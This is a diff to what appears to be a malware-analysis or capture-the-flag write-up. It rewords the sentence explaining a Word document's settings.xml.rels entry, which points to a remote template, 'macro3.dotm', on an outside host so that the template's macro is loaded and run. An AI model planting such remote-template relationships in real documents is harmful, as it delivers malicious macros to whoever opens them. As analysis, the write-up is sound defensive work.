@@ -51,4 +51,4 @@ The word file was then extracted and was navigated to \word\_rels\settings.xml.r
     <Relationship  Id="rId1"  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"  Target="http://somtaw.warship.kuunlaan.local/macro3.dotm"  TargetMode="External"/>
     </Relationships>
 
-Here, it can be seen that it will use the remote template 'macro3.dotm' from 'somtaw.warship.kuunlaan.local', which contains the macro and will execute it. 
+Here, it can be seen in Target value that it will use the remote template 'macro3.dotm' from 'somtaw.warship.kuunlaan.local', which contains the macro and will execute it. 
